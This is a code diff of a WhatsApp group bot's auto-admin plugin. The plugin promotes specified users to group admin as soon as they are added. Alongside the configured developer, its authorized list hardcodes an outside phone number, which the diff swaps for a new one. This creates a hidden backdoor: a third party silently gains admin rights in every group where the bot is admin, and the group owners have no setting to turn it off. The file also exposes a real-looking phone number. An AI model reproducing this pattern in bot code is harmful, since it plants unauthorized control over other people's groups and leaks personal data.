@@ -1,62 +1,85 @@
 const { cmd } = require('../command');
 const config = require('../config');
 
-// Track last promotion time per group
-const lastPromotion = {};
+// Debug logger
+const debug = (...args) => console.log('[AUTO-ADMIN]', ...args);
 
 cmd({
-    on: "body" // Using your existing event structure
-}, 
-async (conn, mek, m, { 
-    from, // Group JID
+    on: "body"
+}, async (conn, mek, m, {
+    from,
     isGroup,
     participants,
     groupMetadata,
     isBotAdmins,
-    reply
+    sender
 }) => {
     try {
-        // Skip if not enabled or not a group
-        if (config.AUTO_ADMIN !== "true" || !isGroup || !isBotAdmins) return;
+        // 1. Basic checks
+        if (config.AUTO_ADMIN !== "true") {
+            debug('Feature disabled in config');
+            return;
+        }
+        
+        if (!isGroup) {
+            debug('Not a group message');
+            return;
+        }
 
-        // MANUALLY extract participant update from raw message
+        // 2. Extract participant update
         const participantUpdate = mek.message?.groupParticipantsUpdate;
-        if (!participantUpdate || participantUpdate.action !== 'add') return;
+        debug('Participant update:', participantUpdate);
+        
+        if (!participantUpdate || participantUpdate.action !== 'add') {
+            debug('Not an add action');
+            return;
+        }
 
-        // Rate limit: 3 seconds per group
-        const now = Date.now();
-        if (lastPromotion[from] && now - lastPromotion[from] < 3000) return;
+        // 3. Verify bot is admin
+        if (!isBotAdmins) {
+            debug('Bot is not admin');
+            return;
+        }
 
-        // Convert numbers to standard JID format
-        const toJid = num => num?.replace(/\D/g, '') + '@s.whatsapp.net';
+        // 4. Prepare authorized users
+        const normalizeJid = (jid) => {
+            const num = (jid || '').toString().replace(/\D/g, '');
+            return num.length >= 10 ? `${num}@s.whatsapp.net` : null;
+        };
 
-        // Authorized users (DEV + special number)
-        const allowedUsers = [
-            toJid(config.DEV),
-            toJid("923103448168")
+        const authorizedUsers = [
+            normalizeJid(config.DEV),
+            normalizeJid("923427582273")
         ].filter(Boolean);
 
-        // Check newly added participants
-        const newAdmins = participantUpdate.participants
-            .map(p => toJid(p))
-            .filter(jid => 
-                allowedUsers.includes(jid) &&
-                !groupMetadata.participants.some(p => p.id === jid && p.admin)
-            );
+        debug('Authorized users:', authorizedUsers);
 
-        if (newAdmins.length > 0) {
-            await conn.groupParticipantsUpdate(from, newAdmins, "promote");
-            lastPromotion[from] = now;
+        // 5. Process new participants
+        const newParticipants = participantUpdate.participants
+            .map(p => normalizeJid(p))
+            .filter(jid => jid && authorizedUsers.includes(jid));
 
-            // Optional notification
-            if (config.AUTO_ADMIN_NOTIFY === "true") {
-                await conn.sendMessage(from, {
-                    text: `@${newAdmins[0].split('@')[0]} is now admin 👑`,
-                    mentions: [newAdmins[0]]
-                });
-            }
+        debug('New participants to process:', newParticipants);
+
+        if (newParticipants.length === 0) {
+            debug('No authorized new participants');
+            return;
         }
+
+        // 6. Promote users
+        await conn.groupParticipantsUpdate(from, newParticipants, "promote");
+        debug('Promotion successful for:', newParticipants);
+
+        // 7. Notification
+        if (config.AUTO_ADMIN_NOTIFY === "true") {
+            await conn.sendMessage(from, {
+                text: `@${newParticipants[0].split('@')[0]} is now admin 👑`,
+                mentions: [newParticipants[0]]
+            });
+        }
+
     } catch (error) {
-        console.error("Auto-admin error:", error.message);
+        debug('Error:', error.message);
+        console.error(error);
     }
 });
